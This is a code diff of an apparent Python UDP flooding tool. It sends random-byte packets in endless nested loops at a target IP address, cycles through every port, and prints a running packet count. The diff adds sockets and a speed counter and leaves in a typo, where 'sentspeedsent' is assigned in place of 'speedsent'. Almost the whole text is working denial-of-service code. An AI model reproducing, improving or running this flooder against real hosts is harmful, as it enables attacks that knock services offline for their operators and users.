@@ -8,13 +8,10 @@ G = '\033[32m'
 C = '\033[36m'
 W = '\033[0m'
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock0 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock3 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 bytes = random._urandom(100)
 bytes1 = random._urandom(1500)
@@ -30,33 +27,34 @@ except SyntaxError:
       print(R + '[-] ' + C + 'Error code: 422 Unprocessable Entity')
 
 sent = 0
+speedsent = 0
 try:
    while True:
-        sock.sendto(bytes2, (ip,port))
+        sock0.sendto(bytes2, (ip,port))
         sent = sent + 1
         port = port + 1
         print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
         if port == 65534:
           port = 1
         while True:
-             sock.sendto(bytes1, (ip,port))
+             sock1.sendto(bytes1, (ip,port))
              sent = sent + 1
              port = port + 1
              print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
              if port == 65534:
                port = 1
              while True:
-                  sock.sendto(bytes, (ip,port))
-                  sent = sent + 1
+                  sock2.sendto(bytes, (ip,port))
+                  speedsent = speedsent + 1
                   port = port + 1
-                  print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
+                  print "Sending %s packet to %s throught port:%s"%(speedsent,ip,port)
                   if port == 65534:
                     port = 1
                   while True:
-                       sock.sendto(bytes, (ip,port))
-                       sent = sent + 1
+                       sock3.sendto(bytes, (ip,port))
+                       sentspeedsent = speedsent + 1
                        port = port + 1
-                       print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
+                       print "Sending %s packet to %s throught port:%s"%(speedsent,ip,port)
                        if port == 65534:
                          port = 1
 
